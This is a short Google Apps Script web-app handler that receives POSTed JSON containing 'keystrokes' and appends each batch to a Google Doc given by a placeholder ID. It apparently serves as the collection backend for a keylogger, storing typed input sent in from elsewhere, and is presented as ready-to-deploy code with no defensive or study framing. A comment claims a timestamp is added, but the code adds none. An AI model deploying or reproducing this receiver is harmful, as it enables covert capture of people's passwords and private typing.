function doPost(e) {
  try {
    // Parse the incoming JSON payload
    var data = JSON.parse(e.postData.contents);

    // Open your target Google Doc by ID
    var doc = DocumentApp.openById("YOUR_DOCUMENT_ID_HERE");        // Replace with your Google Doc ID
    var body = doc.getBody();

    // Append the keystrokes with a timestamp
    body.appendParagraph(data.keystrokes);
    body.appendParagraph("_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-");

    // Return a simple response
    return ContentService.createTextOutput("OK");
  } catch (err) {
    return ContentService.createTextOutput("Error: " + err);
  }
}
